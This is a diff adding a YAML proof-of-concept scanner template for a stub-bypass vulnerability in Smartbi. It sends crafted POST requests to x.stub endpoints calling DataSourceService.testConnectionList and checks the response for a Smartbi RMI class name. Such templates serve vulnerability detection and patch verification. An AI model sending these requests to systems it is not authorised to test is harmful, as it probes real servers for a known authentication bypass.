@@ -1,0 +1,32 @@
+name: poc-yaml-smartbi-stub-bypass
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /smartbi/x.stub
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: |
+                className=DataSourceService&methodName=testConnectionList&params=[[{"test":"clientRerouteServerListJNDIName"}]]
+        expression: response.body_string.contains("smartbi.framework.rmi.ClientService")
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /x.stub
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: |
+                className=DataSourceService&methodName=testConnectionList&params=[[{"test":"clientRerouteServerListJNDIName"}]]
+        expression: response.body_string.contains("smartbi.framework.rmi.ClientService")
+expression: r0() || r1()
+detail:
+    author: yuxiang.cai
+    links:
+        - https://www.smartbi.com.cn/patchinfo
+        - https://wiki.smartbi.com.cn/pages/viewpage.action?pageId=50692623
+    vulnerability:
+        id: CT-605420
